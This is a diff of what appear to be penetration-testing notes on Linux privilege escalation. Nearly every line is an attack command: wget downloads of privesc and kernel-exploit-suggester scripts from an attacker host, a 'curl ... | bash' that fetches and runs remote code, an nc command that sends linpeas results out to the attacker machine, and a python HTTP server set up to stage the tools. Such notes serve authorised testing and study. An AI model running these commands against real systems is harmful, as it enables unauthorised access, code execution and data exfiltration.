@@ -264,12 +264,15 @@ wget http://192.168.162.46:80/suid3num.py                 ..suid check
 wget http://192.168.162.46:80/Linuxprivchecker.py         ..prefer 
 wget http://192.168.162.46:80/LinEnum.sh                  ..second best 
 wget http://192.168.162.46:80/unixprivesc.sh              ..maybe
-wget http://192.168.162.46:80/linux-exploit-suggester.sh  ..kernel
+wget http://192.168.162.46:80/linux-exploit-suggester.sh  ..kernel exploits (dirtycow, rds, etc)
 wget -r http://192.168.162.46:80/ -P /var/tmp/            ..ALL
 curl 192.168.162.46:80/linux-exploit-suggester.sh | bash  ..autorun
 
 
 ===================================
+sudo python3 -m http.server 80
+./linux-exploit-suggester.sh
+
 uname -a 
 kali> linux-exploit-suggester.sh --uname <uname-a string>
 
@@ -291,7 +294,6 @@ linx> nc 192.168.162.46 9090 < linpeas.txt
 
 Send to Target
 scp pspy bob@192.168.200.5
-
 
 
 ===================================
